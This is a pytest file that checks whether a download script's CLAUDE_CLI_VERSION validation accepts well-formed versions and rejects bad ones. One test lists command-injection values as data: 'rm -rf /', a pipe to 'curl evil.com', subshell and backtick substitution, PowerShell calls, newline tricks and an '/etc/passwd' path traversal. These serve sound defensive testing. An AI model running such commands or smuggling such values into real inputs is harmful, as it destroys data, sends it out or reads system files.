"""Tests for scripts/download_cli.py security fixes."""

import os
import sys
from pathlib import Path

import pytest

# Add scripts directory to path so we can import download_cli
scripts_dir = Path(__file__).parent.parent / "scripts"
sys.path.insert(0, str(scripts_dir))

import download_cli  # noqa: E402


class TestCliVersionValidation:
    """Test validation of CLAUDE_CLI_VERSION to prevent command injection."""

    def test_valid_semantic_version(self, monkeypatch):
        """Test that valid semantic versions are accepted."""
        valid_versions = ["1.0.0", "10.20.30", "0.0.1", "999.999.999"]

        for version in valid_versions:
            monkeypatch.setenv("CLAUDE_CLI_VERSION", version)
            result = download_cli.get_cli_version()
            assert result == version

    def test_latest_version(self, monkeypatch):
        """Test that 'latest' is accepted."""
        monkeypatch.setenv("CLAUDE_CLI_VERSION", "latest")
        result = download_cli.get_cli_version()
        assert result == "latest"

    def test_default_is_latest(self, monkeypatch):
        """Test that default version is 'latest' when env var not set."""
        monkeypatch.delenv("CLAUDE_CLI_VERSION", raising=False)
        result = download_cli.get_cli_version()
        assert result == "latest"

    def test_command_injection_attempts_rejected(self, monkeypatch):
        """Test that command injection attempts are rejected."""
        malicious_versions = [
            "1.0.0; rm -rf /",
            "1.0.0 && malicious-command",
            "1.0.0 | curl evil.com",
            "$(malicious-command)",
            "`malicious-command`",
            "1.0.0; Start-Process calc",
            "latest; powershell -c 'evil'",
            "1.0.0\nmalicious-command",
            "1.0.0\rmalicious-command",
            "1.0.0;",
            "1.0.0&",
            "1.0.0|",
            "../../../etc/passwd",
        ]

        for malicious_version in malicious_versions:
            monkeypatch.setenv("CLAUDE_CLI_VERSION", malicious_version)
            with pytest.raises(ValueError, match="Invalid CLAUDE_CLI_VERSION"):
                download_cli.get_cli_version()

    def test_invalid_version_formats_rejected(self, monkeypatch):
        """Test that invalid version formats are rejected."""
        invalid_versions = [
            "v1.0.0",  # No 'v' prefix
            "1.0",  # Missing patch version
            "1",  # Missing minor and patch
            "1.0.0.0",  # Too many components
            "1.0.0-beta",  # Pre-release suffix
            "1.0.0+build",  # Build metadata
            "Latest",  # Wrong case
            "LATEST",  # Wrong case
            "",  # Empty string
            "  1.0.0  ",  # Whitespace
        ]

        for invalid_version in invalid_versions:
            monkeypatch.setenv("CLAUDE_CLI_VERSION", invalid_version)
            with pytest.raises(ValueError, match="Invalid CLAUDE_CLI_VERSION"):
                download_cli.get_cli_version()
